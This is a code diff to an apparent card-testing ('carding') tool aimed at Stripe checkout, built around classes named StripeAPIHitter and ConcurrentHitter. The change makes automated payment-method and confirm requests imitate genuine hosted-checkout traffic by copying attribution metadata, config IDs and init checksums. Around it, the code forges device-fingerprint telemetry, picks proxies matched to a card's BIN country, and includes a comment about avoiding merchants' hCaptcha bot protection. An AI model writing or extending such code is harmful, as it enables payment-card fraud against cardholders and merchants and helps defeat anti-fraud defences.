@@ -169,7 +169,7 @@ class StripeAPIExtractor:
                     tax_country = resp_json['customer']['address']['country']
                     tax_zip = resp_json['customer']['address'].get('postal_code')
                 
-                return {'success': True, 'amount': f"{currency} {amount/100:.2f}" if amount is not None else None, 'raw_amount': amount, 'merchant': merchant, 'locked_email': locked_email, 'tax_country': tax_country, 'tax_zip': tax_zip}
+                return {'success': True, 'amount': f"{currency} {amount/100:.2f}" if amount is not None else None, 'raw_amount': amount, 'merchant': merchant, 'locked_email': locked_email, 'tax_country': tax_country, 'tax_zip': tax_zip, 'init_json': resp_json}
             
             try:
                 err_msg = response.json().get('error', {}).get('message', f'Status {response.status_code}')
@@ -868,7 +868,7 @@ class StripeAPIHitter:
         StripeAPIHitter._live_js_hash_cache = "da394b0aef"
         return StripeAPIHitter._live_js_hash_cache
 
-    def __init__(self, pk_live: str, cs_live: str, proxy_data: Dict, raw_amount: int = None, locked_email: str = None, stripe_account: str = None, tax_country: str = None, tax_zip: str = None):
+    def __init__(self, pk_live: str, cs_live: str, proxy_data: Dict, raw_amount: int = None, locked_email: str = None, stripe_account: str = None, tax_country: str = None, tax_zip: str = None, init_json: dict = None):
         self.pk_live = pk_live
         self.cs_live = cs_live
         self.proxy_data = proxy_data
@@ -877,6 +877,7 @@ class StripeAPIHitter:
         self.stripe_account = stripe_account
         self.tax_country = tax_country
         self.tax_zip = tax_zip
+        self._init_json = init_json or {}
 
     async def generate_stripe_telemetry(self, profile: dict, proxies: dict, address: dict, page_url: str = None, session=None) -> Dict[str, str]:
         """Generate Stripe device fingerprint tokens via m.stripe.com/6"""
@@ -1209,6 +1210,16 @@ class StripeAPIHitter:
                     "sid": stripe_tokens['sid'],
                     "key": self.pk_live,
                 })
+
+                if self.cs_live and isinstance(self.cs_live, str) and self.cs_live.startswith(('cs_live_', 'cs_test_')):
+                    pm_data.update({
+                        "client_attribution_metadata[client_session_id]": self.cs_live,
+                        "client_attribution_metadata[merchant_integration_source]": "checkout",
+                        "client_attribution_metadata[merchant_integration_version]": "hosted_checkout",
+                        "client_attribution_metadata[payment_method_selection_flow]": "automatic",
+                    })
+                    if self._init_json and self._init_json.get("config_id"):
+                        pm_data["client_attribution_metadata[checkout_config_id]"] = self._init_json["config_id"]
                 # Step 1.5: Algorithm 4 - Stripe Link Enrollment Bypass
                 # [DISABLED] Initiating unverified Link sessions often triggers `rqdata` (hCaptcha) 
                 # bot protection on strict merchants like Foyer Tech. It's safer to skip it.
@@ -1312,7 +1323,16 @@ class StripeAPIHitter:
                         "expected_payment_method_type": "card",
                         "consent[terms_of_service]": "accepted",
                         "key": self.pk_live,
+                        "client_attribution_metadata[client_session_id]": self.cs_live,
+                        "client_attribution_metadata[merchant_integration_source]": "checkout",
+                        "client_attribution_metadata[merchant_integration_version]": "hosted_checkout",
+                        "client_attribution_metadata[payment_method_selection_flow]": "automatic",
                     }
+                    if self._init_json:
+                        if self._init_json.get("config_id"):
+                            confirm_data["client_attribution_metadata[checkout_config_id]"] = self._init_json["config_id"]
+                        if self._init_json.get("init_checksum"):
+                            confirm_data["init_checksum"] = self._init_json["init_checksum"]
                     if self.raw_amount is not None and self.raw_amount > 0:
                         confirm_data["expected_amount"] = self.raw_amount
                     elif self._init_json:
@@ -2159,7 +2179,7 @@ class ConcurrentHitter:
                                 pass
                     
                     proxy_data = await ProxyManager.get_geo_matched(self.user_id, bin_country) if bin_country else await ProxyManager.get_random(self.user_id)
-                    hitter = StripeAPIHitter(pk_key, cs_token, proxy_data, raw_amount, locked_email, stripe_account=stripe_account, tax_country=self.url_info.get('tax_country'), tax_zip=self.url_info.get('tax_zip'))
+                    hitter = StripeAPIHitter(pk_key, cs_token, proxy_data, raw_amount, locked_email, stripe_account=stripe_account, tax_country=self.url_info.get('tax_country'), tax_zip=self.url_info.get('tax_zip'), init_json=self.url_info.get('init_json'))
                     
                     import random
                     # For non-reusable links, all workers share the same PI — serialize confirms
